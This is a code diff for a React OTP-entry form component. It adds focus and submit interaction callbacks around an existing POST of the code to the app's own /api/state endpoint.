@@ -12,27 +12,35 @@ const otpSchema = z.object({
 });
 type OtpFormData = z.infer<typeof otpSchema>;
 
-export default function OtpStep() {
+type OtpStepProps = {
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
+};
+
+
+export default function OtpStep({ onInteractionStart, onInteractionEnd }: OtpStepProps) {
   const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<OtpFormData>({
     resolver: zodResolver(otpSchema),
   });
   const { toast } = useToast();
 
   const onSubmit: SubmitHandler<OtpFormData> = async (data) => {
-    try {
-      const res = await fetch("/api/state", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "submitOtp", otp: data.otp }),
-      });
-      if (!res.ok) throw new Error("Server responded with an error.");
-    } catch (error) {
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Could not verify. Please try again.",
-      });
-    }
+    await onInteractionEnd(async () => {
+      try {
+        const res = await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "submitOtp", otp: data.otp }),
+        });
+        if (!res.ok) throw new Error("Server responded with an error.");
+      } catch (error) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Could not verify. Please try again.",
+        });
+      }
+    });
   };
 
   return (
@@ -54,6 +62,7 @@ export default function OtpStep() {
             {...register("otp")}
             className="h-14 pt-2 text-base tracking-[.5em]"
             maxLength={6}
+            onFocus={onInteractionStart}
           />
           {errors.otp && <p className="text-sm text-destructive mt-1 px-1">{errors.otp.message}</p>}
         </div>
